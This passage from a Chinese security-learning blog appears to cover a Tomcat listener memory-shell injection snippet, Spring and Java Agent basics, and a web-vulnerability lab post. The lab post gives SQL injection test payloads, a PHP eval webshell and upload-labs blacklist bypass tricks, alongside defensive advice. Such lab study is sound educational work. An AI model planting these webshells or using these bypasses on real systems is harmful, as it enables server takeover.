sre)</span>&#123;<br>        &#125;<br>    &#125;<br>%&gt;<br><br>&lt;%<br>    <span class="hljs-comment">// 1. 获取 StandardContext 类</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br><br>    <span class="hljs-comment">// 2. 添加监听器</span><br>    <span class="hljs-type">ShellListener</span> <span class="hljs-variable">shellListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellListener</span>();<br>    context.addApplicationEventListener(shellListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="5-Spring-基础"><a href="#5-Spring-基础" class="headerlink" title="5. Spring 基础"></a>5. Spring 基础</h2><p><font style="background-color:#FBDE28;">总结一句话：Spring就是一个轻量级的控制反转（IOC）和面向切面编程（AOP）的框架</font></p><h3 id="5-1-什么是Spring"><a href="#5-1-什么是Spring" class="headerlink" title="5.1 什么是Spring"></a>5.1 什么是Spring</h3><p>Spring是一个轻量级的Java开源框架，用于配置、管理和维护Bean（组件）的一种框架，其核心理念就是<strong>IoC(Inversion of Control,控制反转)</strong> 和 <strong>AOP(AspectOrientedProgramming， 面向切面编程)</strong>。现如今Spring全家桶已是一个庞大的家族</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509336.webp"></p><p>Spring的出现大大简化了JavaEE的开发流程，减少了Java开发时各种繁琐的配置。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508481.webp"></p><p>Spring框架的核心之一就是分层，其由许多大大小小的组件构成，每种组件都实现不同功能。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509118.webp"></p><h3 id="5-2-SpringBoot"><a href="#5-2-SpringBoot" class="headerlink" title="5.2 SpringBoot"></a>5.2 SpringBoot</h3><p><font style="color:rgba(0, 0, 0, 0.9);">Spring Boot 基于 Spring 开发，Spirng Boot 本身并不提供 Spring 框架的核心特性以及扩展功能，只是用于快速、敏捷地开发新一代基于 Spring 框架的应用程序。也就是说，它并不是用来替代 Spring 的解决方案，而是和 Spring 框架紧密结合用于提升 Spring 开发者体验的工具。Spring Boot 以</font><strong><font style="color:rgba(0, 0, 0, 0.9);">约定大于配置的核心思想</font></strong><font style="color:rgba(0, 0, 0, 0.9);">，默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置。同时它集成了大量常用的第三方库配置（例如 Redis、MongoDB、Jpa、RabbitMQ、Quartz 等等），Spring Boot 应用中这些第三方库几乎可以零配置的开箱即用。</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架 。</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">Spring Boot的主要优点：</font></strong></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">为所有Spring开发者更快的入门</font></li><li><strong><font style="color:rgba(0, 0, 0, 0.9);">开箱即用</font></strong><font style="color:rgba(0, 0, 0, 0.9);">，提供各种默认配置来简化项目配置</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">内嵌式容器简化Web项目</font></li><li><font style="color:rgba(0, 0, 0, 0.9);">没有冗余代码生成和XML配置的要求</font></li></ul><h2 id="6-java-Agent"><a href="#6-java-Agent" class="headerlink" title="6. java Agent"></a>6. java Agent</h2><h3 id="6-1-什么是Java-Agent？"><a href="#6-1-什么是Java-Agent？" class="headerlink" title="6.1 什么是Java Agent？"></a>6.1 什么是Java Agent？</h3><p>Java是一种静态强类型语言，在运行之前必须将其编译成<code>.class</code>字节码，然后再交给JVM处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p><p>对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的<code>premain-Agent</code>，另一种是JVM启动之后加载的<code>agentmain-Agent</code>。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508125.jpeg" alt="premain-Agent"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508271.jpeg" alt="agentmain-Agent"></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://www.cnblogs.com/rebeyond/p/9686213.html">【原创】利用“进程注入”实现无文件不死webshell</a></p><p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p><p><a href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Spring内存马 | CurlySean’s Blog</a></p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agent实现反序列化注入内存shell</a></p><p><a href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八</a></p><p><a href="https://su18.org/post/memory-shell-2/">JavaWeb 内存马二周目通关攻略 | 素十八</a></p><p><a href="https://www.4hou.com/posts/zlkq">Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p><p><a href="https://www.freebuf.com/articles/web/433972.html">Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户</a></p><p><a href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客</a></p><p><a href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Spring型内存马分析</a></p><p><a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet 简介 | 菜鸟教程</a></p><p><a href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Spring内存马学习</a></p><p><a href="https://xz.aliyun.com/news/11493">Spring内存马——Controller&#x2F;Interceptor构造</a></p><p>[基础篇 - Javassist 使用指南](<a href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> 安全&#x2F;基础篇-javassist用法指南&#x2F;)</p><p><a href="https://goodapple.top/archives/1145#header-id-20">Java安全学习——ROME反序列化 - 枫のBlog</a> （使用Javassist缩短恶意class）</p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agent实现反序列化注入内存shell</a></p><p><a href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agent内存马 | CurlySean’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>内存马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web漏洞靶场练习(不定时更新)</title>
    <link href="/2025/11/02/web%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/11/02/web%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="初识漏洞"><a href="#初识漏洞" class="headerlink" title="初识漏洞"></a>初识漏洞</h1><h2 id="一、SQL注入漏洞"><a href="#一、SQL注入漏洞" class="headerlink" title="一、SQL注入漏洞"></a>一、SQL注入漏洞</h2><p><a href="https://blog.csdn.net/dreamthe/article/details/124969922?spm=1001.2014.3001.5501">SQL注入实战指南-CSDN博客</a></p><p>SQL注入攻击（SQL Injection）</p><p>SQL注入原理：</p><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><p>SQL注入点判断<br>1.<code>?id=1 and 1=1 </code>和<code>?id=1 and 1=2</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=1 and 1=2<br></code></pre></td></tr></table></figure><p>2.<code>?id=1&#39; and 1=1--+/#</code>和<code>?id=1&#39; and 1=2--+/#</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=2-- &#x27;<br></code></pre></td></tr></table></figure><p>3.<code>?id=1&#39;and 1=1 and &#39;1&#39;=&#39;1</code>和<code>?id=1&#39;and 1=1 and &#39;1&#39;=&#39;1</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=2 and &#x27;1&#x27;=&#x27;1&#x27;<br></code></pre></td></tr></table></figure><p>4.<code>?id=1%&#39; and 1=1 and &#39;%&#39;=&#39;%</code>和<code>?id=1%&#39; and 1=2 and &#39;%&#39;=&#39;%</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT * from table where users like &#x27;%1 %&#x27; and &#x27;1&#x27;=&#x27;1&#x27; and &#x27;%&#x27;=&#x27;%&#x27;<br></code></pre></td></tr></table></figure><p>5.<code>?id=1%&#39; and 1=1--+/#</code>和<code>?id=1%&#39; and 1=2--+/#</code>进行测试如果1&#x3D;1页面显示正常和原页面一样，并且1&#x3D;2页面报错或者页面部分数据显示不正常，那么可以确定此处为搜索型注入。</p><p>通常情况下，SQL注入的位置包括：<br>（1）表单提交，主要是POST请求，也包括GET请求；<br>（2）URL参数提交，主要为GET请求参数；<br>（3）Cookie参数提交；<br>（4）HTTP请求头部的一些可修改的值，比如Referer、User_Agent等；<br>（5）一些边缘的输入点，比如.mp3文件的一些文件信息等。<br>常见的防范方法<br>（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。<br>（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。<br>（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。<br>（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。<br>（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。<br>（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。<br>（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。<br>（8）在网站发布之前建议使用一些专业的SQL注入检测工具进行检测，及时修补这些SQL注入漏洞。</p><h2 id="二、跨站脚本漏洞-XSS"><a href="#二、跨站脚本漏洞-XSS" class="headerlink" title="二、跨站脚本漏洞-XSS"></a>二、跨站脚本漏洞-XSS</h2><p>跨站脚本攻击（Cross-site scripting，通常简称为XSS）发生在客户端，可被用于进行窃取隐私、钓鱼欺骗、窃取密码、传播恶意代码等攻击。<br>XSS攻击使用到的技术主要为HTML和Javascript，也包括VBScript和ActionScript等。XSS攻击对WEB服务器虽无直接危害，但是它借助网站进行传播，使网站的使用用户受到攻击，导致网站用户帐号被窃取，从而对网站也产生了较严重的危害。<br>XSS类型包括：<br>（1）非持久型跨站：即反射型跨站脚本漏洞，是目前最普遍的跨站类型。跨站代码一般存在于链接中，请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码不存储到服务端（比如数据库中）。上面章节所举的例子就是这类情况。<br>（2）持久型跨站：这是危害最直接的跨站类型，跨站代码存储于服务端（比如数据库中）。常见情况是某用户在论坛发贴，如果论坛没有过滤用户输入的Javascript代码数据，就会导致其他浏览此贴的用户的浏览器会执行发贴人所嵌入的Javascript代码。<br>（3）DOM跨站（DOM XSS）：是一种发生在客户端DOM（Document Object Model文档对象模型）中的跨站漏洞，很大原因是因为客户端脚本处理逻辑导致的安全问题。<br>常用的防止XSS技术包括：<br>（1）与SQL注入防护的建议一样，假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。<br>（2）不仅要验证数据的类型，还要验证其格式、长度、范围和内容。<br>（3）不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。<br>（4）对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。<br>（5）在发布应用程序之前测试所有已知的威胁。</p><h2 id="三、弱口令漏洞"><a href="#三、弱口令漏洞" class="headerlink" title="三、弱口令漏洞"></a>三、弱口令漏洞</h2><p>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p><p>设置密码通常遵循以下原则：<br>（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令。<br>（2）口令长度不小于8个字符。<br>（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。<br>（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。<br>（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail地址等等与本人有关的信息，以及字典中的单词。<br>（6）口令不应该为用数字或符号代替某些字母的单词。<br>（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。<br>（8）至少90天内更换一次口令，防止未被发现的入侵者继续使用该口令。</p><h2 id="四、HTTP报头追踪漏洞"><a href="#四、HTTP报头追踪漏洞" class="headerlink" title="四、HTTP报头追踪漏洞"></a>四、HTTP报头追踪漏洞</h2><p>HTTP&#x2F;1.1（RFC2616）规范定义了HTTP TRACE方法，主要是用于客户端通过向Web服务器提交TRACE请求来进行测试或获得诊断信息。当Web服务器启用TRACE时，提交的请求头会在服务器响应的内容（Body）中完整的返回，其中HTTP头很可能包括Session Token、Cookies或其它认证信息。攻击者可以利用此漏洞来欺骗合法用户并得到他们的私人信息。该漏洞往往与其它方式配合来进行有效攻击，由于HTTP TRACE请求可以通过客户浏览器脚本发起（如XMLHttpRequest），并可以通过DOM接口来访问，因此很容易被攻击者利用。<br>防御HTTP报头追踪漏洞的方法通常禁用HTTP TRACE方法。</p><h2 id="五、Struts2远程命令执行漏洞"><a href="#五、Struts2远程命令执行漏洞" class="headerlink" title="五、Struts2远程命令执行漏洞"></a>五、Struts2远程命令执行漏洞</h2><p>ApacheStruts是一款建立Java web应用程序的开放源代码架构。Apache Struts存在一个输入过滤错误，如果遇到转换错误可被利用注入和执行任意Java代码。<br>网站存在远程代码执行漏洞的大部分原因是由于网站采用了Apache Struts Xwork作为网站应用框架，由于该软件存在远程代码执高危漏洞，导致网站面临安全风险。CNVD处置过诸多此类漏洞，例如：“GPS车载卫星定位系统”网站存在远程命令执行漏洞(CNVD-2012-13934)；Aspcms留言本远程代码执行漏洞（CNVD-2012-11590）等。<br>修复此类漏洞，只需到Apache官网升级Apache Struts到最新版本：<a href="http://struts.apache.org/">http://struts.apache.org</a></p><h2 id="六、文件上传漏洞"><a href="#六、文件上传漏洞" class="headerlink" title="六、文件上传漏洞"></a>六、文件上传漏洞</h2><p>文件上传漏洞通常由于网页代码中的文件上传路径变量过滤不严造成的，如果文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。<br>因此，在开发网站及应用程序过程中，需严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关目录的执行权限，防范webshell攻击。</p><h2 id="七、私有IP地址泄露漏洞"><a href="#七、私有IP地址泄露漏洞" class="headerlink" title="七、私有IP地址泄露漏洞"></a>七、私有IP地址泄露漏洞</h2><p>IP地址是网络用户的重要标示，是攻击者进行攻击前需要了解的。获取的方法较多，攻击者也会因不同的网络情况采取不同的方法，如：在局域网内使用Ping指令，Ping对方在网络中的名称而获得IP；在Internet上使用IP版的QQ直接显示。最有效的办法是截获并分析对方的网络数据包。攻击者可以找到并直接通过软件解析截获后的数据包的IP包头信息，再根据这些信息了解具体的IP。<br>针对最有效的“数据包分析方法”而言，就可以安装能够自动去掉发送数据包包头IP信息的一些软件。不过使用这些软件有些缺点，譬如：耗费资源严重，降低计算机性能；访问一些论坛或者网站时会受影响；不适合网吧用户使用等等。现在的个人用户采用最普及隐藏IP的方法应该是使用代理，由于使用代理服务器后，“转址服务”会对发送出去的数据包有所修改，致使“数据包分析”的方法失效。一些容易泄漏用户IP的网络软件(QQ、MSN、IE等)都支持使用代理方式连接Internet，特别是QQ使用“ezProxy”等代理软件连接后，IP版的QQ都无法显示该IP地址。虽然代理可以有效地隐藏用户IP，但攻击者亦可以绕过代理，查找到对方的真实IP地址，用户在何种情况下使用何种方法隐藏IP，也要因情况而论。</p><h2 id="八、未加密登录请求"><a href="#八、未加密登录请求" class="headerlink" title="八、未加密登录请求"></a>八、未加密登录请求</h2><p>由于Web配置不安全，登陆请求把诸如用户名和密码等敏感字段未加密进行传输，攻击者可以窃听网络以劫获这些敏感信息。建议进行例如SSH等的加密后再传输。</p><h2 id="九、敏感信息泄露漏洞"><a href="#九、敏感信息泄露漏洞" class="headerlink" title="九、敏感信息泄露漏洞"></a>九、敏感信息泄露漏洞</h2><p>SQL注入、XSS、目录遍历、弱口令等均可导致敏感信息泄露，攻击者可以通过漏洞获得敏感信息。针对不同成因，防御方式不同</p><h2 id="十、CSRF"><a href="#十、CSRF" class="headerlink" title="十、CSRF"></a>十、CSRF</h2><p><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a></p><ul><li>原理：利用用户认证状态执行非法请求。</li><li>防范：使用 Token 验证、Referer 验证等。</li></ul><h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h1 id="1、upload-labs"><a href="#1、upload-labs" class="headerlink" title="1、upload-labs"></a>1、upload-labs</h1><p>参考资料</p><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果.</p><p><strong>上传漏洞满足条件</strong></p><p>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径。</p><p>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法得到Web容器解释这个脚本，那么也不能称之为漏洞。</p><p>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</p><p>php一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="一、黑名单绕过"><a href="#一、黑名单绕过" class="headerlink" title="一、黑名单绕过"></a>一、黑名单绕过</h3><p>黑名单简单来说就是目标程序规定了哪些文件不能上传</p><p>1、大小写绕过<br>这个没什么好讲的，举个简单的例子，如下</p><p>本来需要上传一个名为a.php的木马文件，有时候将文件名改为以下的样子就能绕过一些黑名单限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">a.PHP<br>a.Php<br>a.PhP<br></code></pre></td></tr></table></figure><p>还有几种组合啊，懒得写了，这种方式还是比较简单的</p><p>2、空格绕过<br>在讲解空格绕过之前要先给大家讲一个系统层面上的特性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">在系统层面上，当我保存了一个名为a.txt的文件时，当我在文件名 前面或者后面加上一个空格，在保存时在系统层面上是没有空格的，但是在PHP传输的过程中，是可以识别这个空格的，所以也就诞生我们的空格绕过方式<br>例： 如果目标的黑名单过滤中只有“.php”，而没有“.php ”这样的后缀时，就可以上传时使用burp抓包，在上传的文件名前面或者后面添加空格，再放包就能成功上传，实现绕过<br></code></pre></td></tr></table></figure><p>3、点号绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">这个点号绕过也是系统层面的原理，很空格过滤没什么区别，当你重命名文件名时，如果在 文件后缀名加上一个点，此时保存后系统会在自动过滤末尾的点号<br></code></pre></td></tr></table></figure><p>使用方法同空格过滤一样，例如上传一个a.php文件，burp抓包将文件名改为“a.php.”，此时放包，如果黑名单检测中没有对“php.”过滤，就能实现绕过</p><p>4、::$data绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">条件：只适用于windows<br></code></pre></td></tr></table></figure><p>这里能绕过的原理是因为windows的NTFS文件系统的一个特性，windows都适用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">也就是当我们访问a.php::$data时，也就是相当于访问a.php本身<br>当我们访问ab:a.php::$data时，也就是访问ab文件夹下的a.php文件本身<br></code></pre></td></tr></table></figure><p>这个绕过方式的使用和前面两个一样，都是burp抓包改文件名就行了，例如把a.php改为a.php::$data,只要他没有做对应的过滤就能绕过黑名单检测</p><p>**注意：**这种方法确实能绕过限制，但是当我们开新标签访问我们上传的文件时会报错，需要把此时url中的::$data删掉才能正常访问<br>5、单次过滤绕过<br>先来看看下面这一段过滤代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);<br>        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);<br>        $file_name = deldot($file_name);//删除文件名末尾的点<br>        $file_ext = strrchr($file_name, &#x27;.&#x27;);<br>        $file_ext = strtolower($file_ext); //转换为小写<br>        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA<br>        $file_ext = trim($file_ext); //首尾去空<br></code></pre></td></tr></table></figure><p>假设我们上传的文件经过这样一次过滤后才能成功上传，初略一看这里的过滤其实还挺多的，但是这里有一个最大的问题——我们上传的文件<strong>只经过了一次</strong>这样的过滤，例如我们上传a.php，burp抓包后修改为“a.php. .”，此时点击放包，处理流程如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">遇到上面删除文件末尾的点的过滤时， 末尾的点被删除，此时文件名——“a.php. ”<br>接着往下过滤，遇到首位去空时， 末尾的空格被删除，此时文件名——“a.php.”<br>接着往下过滤，你会发现它已经过滤完了，它会将此时的结果拿去$deny_ext进行 黑名单检测<br></code></pre></td></tr></table></figure><p>但是黑名单中“a.php.”能被检测到吗？不能，所以自然就绕过了过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">这里的思路就是假如我们已经知道了目标的一个过滤规则，那我们就可以尝试 使用两次对应的过滤来绕过，假如它所有的过滤都只进行一次，那就可以宣布拿下了<br></code></pre></td></tr></table></figure><p>6、后缀双写绕过<br>双写后缀的方式只适合 目标服务器的过滤规则是检测到黑名单后缀时，将文件名中对应后缀删除的情况<br>例如服务器检测的黑名单如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">此时我们上传一个a.php文件，服务器会那黑名单中的内容来匹配，匹配到php后，就会把原来的文件名“ a.php”后面的php后缀删掉，此时的文件名——“ a.”，此时这个文件倒是能成功上传，但是已经不会被解析为php了，，这就是整个过滤流程<br>而我们对应的绕过方式就是——双写后缀绕过<br></code></pre></td></tr></table></figure><p>条件还是这个服务器只进行了一次过滤，例如我们上传a.php，burp抓包，将文件名改为“a.pphphp”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">进入文件上传流程，识别文件后缀，为“pphphp”。<br>从左到右识别，当识别当第二位到第四位的php时，即“p phphp”,判定后缀名存在黑名单，将识别到的php删除，后缀中剩下的字符组合后，此时后缀“pphphp”就成了“php”,此时剩下的文件名——“a.php”,程序以为处理完了，没有危害，所以文件成功上传，不进行拦截，即成功绕过<br></code></pre></td></tr></table></figure><p>a.php文件，自然我们访问时也能以正常php去解析</p><h3 id="二、白名单绕过"><a href="#二、白名单绕过" class="headerlink" 